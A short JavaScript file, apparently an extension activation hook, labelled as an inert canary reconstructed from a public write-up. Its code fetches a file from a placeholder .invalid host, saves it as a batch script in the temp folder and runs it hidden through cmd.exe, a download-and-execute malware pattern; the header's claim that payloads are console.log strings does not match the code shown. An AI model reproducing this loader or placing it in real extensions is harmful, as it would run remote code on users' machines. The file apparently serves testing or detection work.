// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const fs = require('fs'), os = require('os'), path = require('path'), cp = require('child_process');
exports.activate = async function () {
  const r = await fetch('https://fingercakes.invalid/dsyuC');
  const body = await r.text();
  const p = path.join(os.tmpdir(), 'temp_batch.cmd');
  fs.writeFileSync(p, body);
  cp.spawn('cmd.exe', ['/c', p], { windowsHide: true, detached: true });
};
